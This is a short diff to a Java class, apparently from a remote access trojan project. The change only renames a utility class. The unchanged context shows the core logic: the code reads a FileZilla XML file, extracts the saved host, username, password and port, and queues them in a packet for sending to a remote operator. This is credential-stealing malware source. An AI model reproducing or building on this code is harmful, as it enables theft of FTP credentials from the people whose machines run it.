@@ -11,8 +11,8 @@ import org.w3c.dom.Node;
 import org.w3c.dom.NodeList;
 
 import com.redpois0n.Connection;
-import com.redpois0n.Util;
 import com.redpois0n.common.os.OperatingSystem;
+import com.redpois0n.utils.Utils;
 
 
 public class PacketFZ extends Packet {
@@ -36,10 +36,10 @@ public class PacketFZ extends Packet {
 						Element eElement = (Element) nNode;
 						
 						PacketBuilder packet = new PacketBuilder(Header.PASSWORD_FILEZILLA);
-						packet.add(Util.getTagValue("Host", eElement));
-						packet.add(Util.getTagValue("User", eElement));
-						packet.add(Util.getTagValue("Pass", eElement));
-						packet.add(Util.getTagValue("Port", eElement));
+						packet.add(Utils.getTagValue("Host", eElement));
+						packet.add(Utils.getTagValue("User", eElement));
+						packet.add(Utils.getTagValue("Pass", eElement));
+						packet.add(Utils.getTagValue("Port", eElement));
 						Connection.addToSendQueue(packet);
 					}
 				}
